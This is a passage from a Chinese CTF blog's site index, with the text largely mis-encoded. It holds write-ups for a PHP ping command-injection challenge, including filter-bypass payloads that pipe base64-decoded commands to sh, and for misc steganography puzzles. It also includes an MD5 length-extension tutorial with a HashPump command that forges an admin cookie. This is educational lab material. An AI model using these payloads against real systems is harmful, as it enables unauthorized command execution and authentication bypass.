class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">$ip = $_GET[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, $ip, $match))&#123;</span><br><span class="line"><span class="keyword">echo</span> preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, $ip, $match);</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ /&quot;</span>, $ip))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/bash/&quot;</span>, $ip))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, $ip))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$a = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.$ip);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†ä¸€å¤§å †ä¸œè¥¿</p><p>payload:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=;cat<span class="variable">$IFS</span>`ls`</span><br></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=||<span class="built_in">echo</span><span class="variable">$IFS</span><span class="variable">$1Y2F0IGZsYWcucGhw</span>|base64<span class="variable">$IFS</span><span class="variable">$1</span>-d|sh</span><br></pre></td></tr></table></figure><p><code>Y2F0IGZsYWcucGhw</code>æ˜¯<code>cat flag.php</code>çš„æ„æ€</p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="ä½›ç³»é’å¹´"><a href="#ä½›ç³»é’å¹´" class="headerlink" title="ä½›ç³»é’å¹´"></a>ä½›ç³»é’å¹´</h3><p>è¿™é¢˜ç›´æ¥binwalkå‹ç¼©åŒ…ä¼šå¡ä½ï¼Œæ•²ä¸‹å›è½¦å°±è¡Œï¼Œåˆ†ç¦»å‡ºä¸‰ä¸ªæ–‡ä»¶</p><p><img src="/2019/12/21/gxy-2019-wp/20191222110458.png"></p><p><code>fo.txt</code>é‡Œé¢æœ‰ä¸ä½›è®ºç¦…åŠ å¯†ï¼Œæ‹¿åˆ°<a href="keyfc.net/bbs/tools/tudoucode.aspx">è¿™é‡Œ</a>è§£å¯†ä¸€ä¸‹å°±å¯ä»¥å¾—åˆ°flag</p><p>å…¶å®è¿™é¢˜çš„çœŸæ­£è€ƒç‚¹æ˜¯zipä¼ªåŠ å¯†ï¼Œç”¨binwalkåˆ†ç¦»å‡ºçš„<code>0.zip</code>æ˜¯ç»è¿‡zipä¼ªåŠ å¯†çš„ï¼Œæˆ‘æ˜¯ç”¨çš„winrarä¿®å¤çš„ï¼Œæ¯”å¯¹ä¸€ä¸‹ä¸¤ä¸ªæ–‡ä»¶ï¼Œå‘ç°åªæœ‰ä¸€å¤„ä¸åŒï¼Œå³å…¨å±€æ–¹å¼ä½æ ‡è®°ä¸åŒ(ç”¨äºåŒºåˆ†æ˜¯å¦æœ‰åŠ å¯†)ï¼Œ<code>00 00</code>ä»£è¡¨æ— åŠ å¯†ï¼Œ<code>00 09</code>ä»£è¡¨æœ‰åŠ å¯†ï¼Œå› æ­¤ä¹Ÿå¯ä»¥æ‰‹åŠ¨ä¿®æ”¹ï¼Œå…³äºzipä¼ªåŠ å¯†çš„ï¼Œå‚è§ï¼š<a href="https://www.cnblogs.com/xishaonian/p/7713657.html">link</a><br><img src="/2019/12/21/gxy-2019-wp/20191222111415.png"></p><h3 id="gakki"><a href="#gakki" class="headerlink" title="gakki"></a>gakki</h3><p>è§£å‹å‘ç°æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œbinwalkä¸€ä¸‹ï¼Œåˆ†ç¦»å‡ºå‹ç¼©åŒ…<br><img src="/2019/12/21/gxy-2019-wp/20191222112643.png"></p><p>æ˜¯æœ‰åŠ å¯†çš„ï¼Œæ²¡ä»€è«æ€è·¯ï¼Œæ˜¯ä¸æ˜¯ç®€å•çš„å¯†ç ï¼Ÿè¯•è¯•å‘—</p><p><img src="/2019/12/21/gxy-2019-wp/20191222113136.png"></p><p>å¯†ç ä¸º8864ï¼Œæ‰“å¼€<code>flag.txt</code>å‘ç°å¥½åƒä¹±ç çš„ä¸œè¥¿</p><p><img src="/2019/12/21/gxy-2019-wp/20191222113455.png"></p><p>ç¥é­”åŠ å¯†å‘¢ï¼Ÿä¸ç®—æ˜¯åŠ å¯†</p><p><img src="/2019/12/21/gxy-2019-wp/20191222120106.png"></p><p>è¿™äº›å­—ç¬¦å…¶å®æ˜¯ç”±flagçš„å†…å®¹ï¼Œé¡ºåºæ˜¯æŒ‰ç…§å‡ºç°çš„æ¬¡æ•°ä»å¤§åˆ°å°æ’åºï¼Œä¸Šè„šæœ¬å§</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fp=open(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">print(fp)</span><br><span class="line">dic=&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> tr <span class="keyword">in</span> fp:</span><br><span class="line">dic[tr]=fp.count(tr)</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> sorted(dic,key=dic.__getitem__,reverse=<span class="literal">True</span>):</span><br><span class="line">print(k,end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>äººç”Ÿè‹¦çŸ­æˆ‘ç”¨python</p><h3 id="SXMgdGhpcyBiYXNlPw"><a href="#SXMgdGhpcyBiYXNlPw" class="headerlink" title="SXMgdGhpcyBiYXNlPw=="></a>SXMgdGhpcyBiYXNlPw==</h3><p>æœ¬é¢˜æ˜¯base64éšå†™ï¼Œé¢˜ç›®å†…å®¹</p><p>å…³äºbase64éšå†™çš„å†…å®¹ï¼Œå‚è§è¿™ä½<a href="https://www.tr0y.wang/2017/06/14/Base64steg/">å¤§ä½¬çš„blog</a></p><p>è¿™é“é¢˜ç›´æ¥ç”¨è„šæœ¬è·‘å°±è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">bin_str=<span class="string">&#x27;&#x27;</span></span><br><span class="line">b64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;code.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        stegb64=<span class="string">&quot;&quot;</span>.join(line.split())</span><br><span class="line">        rowb64=<span class="string">&quot;&quot;</span>.join(str(base64.b64encode(base64.b64decode(stegb64)),<span class="string">&#x27;utf-8&#x27;</span>).split())</span><br><span class="line">        offset=abs(b64chars.index(stegb64.replace(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&#x27;</span>)[<span class="number">-1</span>])-b64chars.index(rowb64.replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)[<span class="number">-1</span>]))</span><br><span class="line">        equalnum=line.count(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> equalnum:</span><br><span class="line">            bin_str += bin(offset)[<span class="number">2</span>:].zfill(equalnum * <span class="number">2</span>)</span><br><span class="line">    print(<span class="string">&#x27;&#x27;</span>.join([chr(int(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(bin_str),<span class="number">8</span>)]))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> GXY </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å“ˆå¸Œæ‰©å±•é•¿åº¦æ”»å‡»å­¦ä¹ </title>
      <link href="2019/12/16/hash-extend-attack/"/>
      <url>2019/12/16/hash-extend-attack/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†hashæ‰©å±•é•¿åº¦æ”»å‡»ä¸»è¦æ–¹å¼åŠåŸç†ï¼ï¼ï¼</p><a id="more"></a><h2 id="hashåŸç†"><a href="#hashåŸç†" class="headerlink" title="hashåŸç†"></a>hashåŸç†</h2><p><img src="/2019/12/16/hash-extend-attack/9113969-b94ef1797456d888.png"></p><p>é¦–å…ˆï¼Œå½“hashå‡½æ•°æ‹¿åˆ°éœ€è¦è¢«hashçš„å­—ç¬¦ä¸²åï¼Œå…ˆå°†å…¶å­—èŠ‚é•¿åº¦æ•´é™¤64ï¼Œå–å¾—ä½™æ•°ã€‚å¦‚æœè¯¥ä½™æ•°æ­£å¥½ç­‰äº56ï¼Œé‚£ä¹ˆå°±åœ¨è¯¥å­—ç¬¦ä¸²æœ€åæ·»åŠ ä¸Š8ä¸ªå­—èŠ‚çš„é•¿åº¦æè¿°ç¬¦ï¼ˆå…·ä½“ç”¨bitè¡¨ç¤ºï¼‰ã€‚å¦‚æœä¸ç­‰äº56ï¼Œå°±å…ˆå¯¹å­—ç¬¦ä¸²è¿›è¡Œé•¿åº¦å¡«å……ï¼Œå¡«å……æ—¶ç¬¬ä¸€ä¸ªå­—èŠ‚ä¸ºhex(80)ï¼Œå…¶ä»–å­—èŠ‚å‡ç”¨hex(00)å¡«å……ï¼Œå¡«å……è‡³ä½™æ•°ä¸º56åï¼ŒåŒæ ·å¢åŠ 8ä¸ªå­—èŠ‚çš„é•¿åº¦æè¿°ç¬¦ï¼ˆè¯¥é•¿åº¦æè¿°ç¬¦ä¸ºéœ€è¦è¢«hashçš„å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œä¸æ˜¯å¡«å……ä¹‹åæ•´ä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦ï¼‰ã€‚ä»¥ä¸Šè¿‡ç¨‹ï¼Œç§°ä¹‹ä¸ºè¡¥ä½ã€‚</p><p>è¡¥ä½å®Œæˆåï¼Œå­—ç¬¦ä¸²ä»¥64ä½ä¸€ç»„è¿›è¡Œåˆ†ç»„ï¼ˆå› ä¸ºä¸Šé¢çš„ä½™æ•°ä¸º56,åŠ ä¸Š8ä¸ªå­—èŠ‚çš„é•¿åº¦æè¿°ç¬¦åï¼Œæ­£å¥½æ˜¯64ä½ï¼Œå‡‘æˆä¸€ç»„ï¼‰ã€‚å­—ç¬¦ä¸²èƒ½è¢«åˆ†æˆå‡ ç»„å°±ä¼šè¿›è¡Œå¤šå°‘æ¬¡â€œå¤æ‚çš„æ•°å­¦å˜åŒ–â€ã€‚æ¯æ¬¡è¿›è¡Œâ€œå¤æ‚çš„æ•°å­¦å˜åŒ–â€éƒ½ä¼šç”Ÿæˆä¸€ç»„æ–°çš„registerså€¼ä¾›ä¸‹ä¸€æ¬¡â€œå¤æ‚çš„æ•°å­¦å˜åŒ–â€æ¥è°ƒç”¨ã€‚ç¬¬ä¸€æ¬¡â€œå¤æ‚çš„æ•°å­¦å˜åŒ–â€ä¼šè°ƒç”¨ç¨‹åºä¸­çš„é»˜è®¤å€¼ã€‚å½“åé¢å·²ç»æ²¡æœ‰åˆ†ç»„å¯ä»¥è¿›è¡Œæ•°å­¦å˜åŒ–æ—¶ï¼Œè¯¥ç»„ç”Ÿæˆçš„registerså€¼å°±æ˜¯æœ€åçš„hashå€¼ã€‚</p><p>ä¸ºç¡®ä¿åŒä¸€ä¸ªå­—ç¬¦ä¸²çš„hashå€¼å”¯ä¸€ï¼Œæ‰€ä»¥éœ€è¦ä¿è¯ç¬¬ä¸€æ¬¡registersçš„å€¼ä¹Ÿå”¯ä¸€ã€‚æ‰€ä»¥åœ¨hashç®—æ³•ä¸­ï¼Œregisterså…·æœ‰åˆå§‹å€¼ã€‚å¦‚ä¸Šå›¾ä¸­çš„registerså€¼0ã€‚</p><h2 id="md5çš„åŠ å¯†è¿‡ç¨‹"><a href="#md5çš„åŠ å¯†è¿‡ç¨‹" class="headerlink" title="md5çš„åŠ å¯†è¿‡ç¨‹"></a>md5çš„åŠ å¯†è¿‡ç¨‹</h2><h3 id="æ€»ä½“æ€è·¯"><a href="#æ€»ä½“æ€è·¯" class="headerlink" title="æ€»ä½“æ€è·¯"></a>æ€»ä½“æ€è·¯</h3><p>MD5åŠ å¯†è¿‡ç¨‹ä¸­512æ¯”ç‰¹ï¼ˆ64å­—èŠ‚ï¼‰ä¸ºä¸€ç»„ï¼Œå±äºåˆ†ç»„åŠ å¯†ï¼Œè€Œä¸”åœ¨è¿ç®—çš„è¿‡ç¨‹ä¸­ï¼Œå°†512æ¯”ç‰¹åˆ†ä¸º32bit*16å—ï¼Œåˆ†å—è¿ç®— </p><p>æˆ‘ä»¬å…³é”®åˆ©ç”¨çš„æ˜¯MD5çš„å¡«å……ï¼Œå¯¹åŠ å¯†çš„å­—ç¬¦ä¸²è¿›è¡Œå¡«å……(æ¯”ç‰¹ç¬¬ä¸€ä½ä¸º1å…¶ä½™æ¯”ç‰¹ä¸º0)ï¼Œä½¿ä¹‹(äºŒè¿›åˆ¶)è¡¥åˆ°448æ¨¡512åŒä½™ï¼Œå³é•¿åº¦ä¸º512çš„å€æ•°å‡64ï¼Œæœ€åçš„64ä½åœ¨è¡¥å……ä¸ºåŸæ¥å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œè¿™æ ·åˆšå¥½è¡¥æ»¡512ä½çš„å€æ•°ï¼Œå¦‚æœå½“å‰æ˜æ–‡æ­£å¥½æ˜¯512bitå€æ•°åˆ™å†åŠ ä¸Šä¸€ä¸ª512bitçš„ä¸€ç»„ã€‚ </p><p>MD5ä¸ç®¡æ€ä¹ˆåŠ å¯†ï¼Œæ¯ä¸€å—åŠ å¯†å¾—åˆ°çš„å¯†æ–‡ä½œä¸ºä¸‹ä¸€æ¬¡åŠ å¯†çš„åˆå§‹å‘é‡IVï¼Œè¿™ä¸€ç‚¹å¾ˆå…³é”®ï¼ï¼ï¼</p><h3 id="è¡¥ä½"><a href="#è¡¥ä½" class="headerlink" title="è¡¥ä½"></a>è¡¥ä½</h3><p>ä¸¾ä¸ªä¾‹å­ï¼šå‡è®¾æˆ‘ä»¬è¦å¯¹æŸä¸ªå­—ç¬¦ä¸²MD5åŠ å¯†ï¼Œé¦–å…ˆå…ˆè½¬æ¢æˆ16è¿›åˆ¶</p><p><img src="/2019/12/16/hash-extend-attack/20191230010751.png"></p><p>æ³¨æ„ï¼šå­—ç¬¦æ˜¯ä»¥ASCIIç å­˜åœ¨çš„ï¼ŒASCIIç è½¬æ¢æˆäºŒè¿›åˆ¶æ•°å­˜åœ¨ï¼Œæ¯ä¸ªå­—ç¬¦ç›¸å½“äºä¸€å­—èŠ‚(1byte)å³8ä½(8bit)</p><p>è€ŒMD5åŠ å¯†çš„è¿‡ç¨‹ä¸­ä¼šåˆ¤æ–­<code>len(message) % 512bit</code>æ˜¯å¦ä¸º448bitã€‚å¦‚æœæ˜¯çš„è¯ï¼Œå°±åœ¨åé¢å¡«å……8ä¸ªå­—èŠ‚(64bit)çš„é•¿åº¦æè¿°ç¬¦ï¼Œå¦‚æœä¸æ˜¯ï¼Œåˆ™åœ¨å…¶åé¢å¡«å……hex(80)å³è€Œè¿›è¡ŒäºŒè¿›åˆ¶çš„<code>100000000</code>ï¼Œç„¶åå†å¡«å……hex(00)ç›´åˆ°é•¿åº¦%512bit=448bitï¼Œç„¶åå°±æ˜¯å¡«å……8ä¸ªå­—èŠ‚çš„é•¿åº¦æè¿°ç¬¦</p><h3 id="è¡¥é•¿åº¦"><a href="#è¡¥é•¿åº¦" class="headerlink" title="è¡¥é•¿åº¦"></a>è¡¥é•¿åº¦</h3><p>é•¿åº¦æè¿°ç¬¦çš„å¡«å……å†…å®¹å³ä¸ºåŸåŠ å¯†å­—ç¬¦ä¸²çš„çš„bité•¿åº¦ï¼Œä¾‹å¦‚ç¤ºä¾‹æ˜¯4ä¸ªå­—èŠ‚ï¼Œ32bitï¼Œå¯¹åº”16è¿›åˆ¶å°±æ˜¯<code>0x0000000000000020</code>ï¼Œç”±äºå¡«å……æ—¶æ˜¯å°ç«¯åºæ”¾çš„ï¼Œé‚£ä¹ˆå¡«å……çš„æ•°æ®å°†ä¼šæ˜¯å°ç«¯åºå­˜æ”¾çš„ï¼Œå³<code>0x2000000000000000</code></p><p><img src="/2019/12/16/hash-extend-attack/20191230015639.png"></p><h3 id="è®¡ç®—æ¶ˆæ¯æ‘˜è¦"><a href="#è®¡ç®—æ¶ˆæ¯æ‘˜è¦" class="headerlink" title="è®¡ç®—æ¶ˆæ¯æ‘˜è¦"></a>è®¡ç®—æ¶ˆæ¯æ‘˜è¦</h3><p>è®¡ç®—æ¶ˆæ¯æ‘˜è¦å¿…é¡»ç”¨è¡¥ä½å·²ç»è¡¥é•¿åº¦å®Œæˆä¹‹åçš„æ¶ˆæ¯æ¥è¿›è¡Œè¿ç®—ï¼Œæ‹¿å‡º 512 bitçš„æ¶ˆæ¯ï¼ˆå³64å­—èŠ‚ï¼‰ã€‚ è®¡ç®—æ¶ˆæ¯æ‘˜è¦çš„æ—¶å€™ï¼Œæœ‰ä¸€ä¸ªåˆå§‹çš„é“¾å˜é‡ï¼Œç”¨æ¥å‚ä¸ç¬¬ä¸€è½®çš„è¿ç®—ã€‚MD5 çš„åˆå§‹é“¾å˜é‡ä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A&#x3D;0x67452301 </span><br><span class="line">B&#x3D;0xefcdab89 </span><br><span class="line">C&#x3D;0x98badcfe </span><br><span class="line">D&#x3D;0x10325476 </span><br></pre></td></tr></table></figure><p>ï¼ˆæ³¨æ„è¿™é‡Œè¿™4ä¸ªå€¼æ˜¯åœ¨md5ç®—æ³•ä¸­<code>å†™æ­»çš„</code>ï¼Œ<code>å†™æ­»çš„</code>ã€‚ã€‚ã€‚ã€‚ï¼‰<br>æˆ‘ä»¬ä¸éœ€è¦å…³å¿ƒè®¡ç®—ç»†èŠ‚ï¼Œæˆ‘ä»¬åªéœ€è¦çŸ¥é“ç»è¿‡ä¸€æ¬¡æ¶ˆæ¯æ‘˜è¦åï¼Œä¸Šé¢çš„é“¾å˜é‡å°†ä¼šè¢«æ–°çš„å€¼è¦†ç›–ï¼Œè€Œæœ€åä¸€è½®äº§ç”Ÿçš„é“¾å˜é‡ç»è¿‡é«˜ä½ä½äº’æ¢ï¼ˆå¦‚ï¼šaabbccdd -&gt; ddccbbaaï¼‰åå°±æ˜¯æˆ‘ä»¬è®¡ç®—å‡ºæ¥çš„ md5 å€¼ã€‚</p><h2 id="æ”»å‡»æ–¹å¼"><a href="#æ”»å‡»æ–¹å¼" class="headerlink" title="æ”»å‡»æ–¹å¼"></a>æ”»å‡»æ–¹å¼</h2><p>hashé•¿åº¦æ‰©å±•çš„å¤§æ¦‚æ„æ€å°±æ˜¯ï¼š</p><p>å·²çŸ¥<code>secret</code>é•¿åº¦ï¼Œ<code>data</code>å€¼ï¼Œä»¥åŠ<code>secret+data</code>çš„hashå€¼ï¼Œå°±å¯ä»¥æ±‚å‡º<code>secret+å…¶ä»–æ•°æ®</code>çš„hashå€¼</p><h2 id="HashPump"><a href="#HashPump" class="headerlink" title="HashPump"></a>HashPump</h2><p>HashPumpæ˜¯ä¸€ä¸ªå€ŸåŠ©äºOpenSSLå®ç°äº†é’ˆå¯¹å¤šç§æ•£åˆ—å‡½æ•°çš„æ”»å‡»çš„å·¥å…·ï¼Œæ”¯æŒé’ˆå¯¹MD5ã€CRC32ã€SHA1ã€SHA256å’ŒSHA512ç­‰é•¿åº¦æ‰©å±•æ”»å‡»ã€‚è€ŒMD2ã€SHA224å’ŒSHA384ç®—æ³•ä¸å—æ­¤æ”»å‡»çš„å½±å“ï¼Œå› å…¶éƒ¨åˆ†é¿å…äº†å¯¹çŠ¶æ€å˜é‡çš„è¾“å‡ºï¼Œå¹¶ä¸è¾“å‡ºå…¨éƒ¨çš„çŠ¶æ€å˜é‡ã€‚</p><p>å®‰è£…æ­¥éª¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/bwall/HashPump</span><br><span class="line">apt-get install g++ libssl-dev</span><br><span class="line"><span class="built_in">cd</span> HashPump</span><br><span class="line">make</span><br></pre></td></tr></table></figure><h2 id="CTFé¢˜ç›®"><a href="#CTFé¢˜ç›®" class="headerlink" title="CTFé¢˜ç›®"></a>CTFé¢˜ç›®</h2><h3 id="å®éªŒå§"><a href="#å®éªŒå§" class="headerlink" title="å®éªŒå§"></a>å®éªŒå§</h3><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">setcookie(<span class="string">&quot;sample-hash&quot;</span>, md5($secret . urldecode(<span class="string">&quot;admin&quot;</span> . <span class="string">&quot;admin&quot;</span>)), time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line"><span class="comment">// This secret is 15 characters long for security!</span></span><br><span class="line">$username = $_POST[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">$password = $_POST[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_COOKIE[<span class="string">&quot;getmein&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (urldecode($username) === <span class="string">&quot;admin&quot;</span> &amp;&amp; urldecode($password) != <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($_COOKIE[<span class="string">&quot;getmein&quot;</span>] === md5($secret . urldecode($username . $password))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Congratulations! You are a registered user.\n&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;The flag is &quot;</span>. $flag);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;Your cookies don&#x27;t match up! STOP HACKING THIS SITE.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&quot;You are not an admin! LEAVE.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>æŠ“åŒ…åœ¨Cookieé‡Œæˆ‘ä»¬çœ‹åˆ°äº†<code>$secret+&#39;adminadmin&#39;</code>çš„MD5å€¼ï¼Œç°åœ¨æˆ‘ä»¬åªéœ€è¦æ±‚<code>$secret+&#39;admin&#39;+å…¶ä»–å€¼</code>çš„MD5å€¼å°±èƒ½å¾—åˆ°flagï¼Œå·²çŸ¥<code>$secret</code>é•¿åº¦ä¸º15ï¼ŒåŠ ä¸Šadminé•¿åº¦ä¸º20ï¼Œæ­¤æ—¶æˆ‘ä»¬å°±èƒ½ç”¨hashpump</p><img src="/2019/12/16/hash-extend-attack/TIMæˆªå›¾20200423145553.png" style="zoom:80%;"><p>è¿˜å¯ä»¥ç›´æ¥ç”¨å‘½ä»¤è¡Œå½¢å¼</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashpump -s 49848099cde7e537e5fe4d88d0ba90f8 -d admin -k 20 -a moonback</span><br></pre></td></tr></table></figure><img src="/2019/12/16/hash-extend-attack/TIMæˆªå›¾20200423150026.png" style="zoom:80%;"><p>æŠŠ<code>\x</code>æ›¿æ¢æˆ<code>%</code></p><img src="/2019/12/16/hash-extend-attack/TIMæˆªå›¾20200423145731.png" style="zoom: 80%;"><p>å¯ä»¥çœ‹åˆ°æˆåŠŸå¾—åˆ°flag</p><h3 id="JarvisOJ"><a href="#JarvisOJ" class="headerlink" title="JarvisOJ"></a>JarvisOJ</h3><p><a href="https://www.moonback.xyz/2019/10/05/jarvisoj-web-wp/#flag%E5%9C%A8%E7%AE%A1%E7%90%86%E5%91%98%E6%89%8B%E9%87%8C">https://www.moonback.xyz/2019/10/05/jarvisoj-web-wp/#flagåœ¨ç®¡ç†å‘˜æ‰‹é‡Œ</a></p><h3 id="NPUCTF"><a href="#NPUCTF" class="headerlink" title="NPUCTF"></a>NPUCTF</h3><p>å‚è§:<a href="http://www.moonback.xyz/2019/10/05/jarvisoj-web-wp/#flag%E5%9C%A8%E7%AE%A1%E7%90%86%E5%91%98%E6%89%8B%E9%87%8C">http://www.moonback.xyz/2019/10/05/jarvisoj-web-wp/#flag%E5%9C%A8%E7%AE%A1%E7%90%86%E5%91%98%E6%89%8B%E9%87%8C</a></p><p>å‚è€ƒï¼š</p><p><a href="https://blog.blacsheep.cn/2017/12/10/md5%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/">https://blog.blacsheep.cn/2017/12/10/md5é•¿åº¦æ‰©å±•æ”»å‡»/</a></p><p><a href="https://gtfly.github.io/2019/03/21/Hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/">https://gtfly.github.io/2019/03/21/Hashé•¿åº¦æ‰©å±•æ”»å‡»å­¦ä¹ /</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> hash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXEå­¦ä¹ </title>
      <link href="2019/12/14/xxe-study/"/>
      <url>2019/12/14/xxe-study/</url>
      
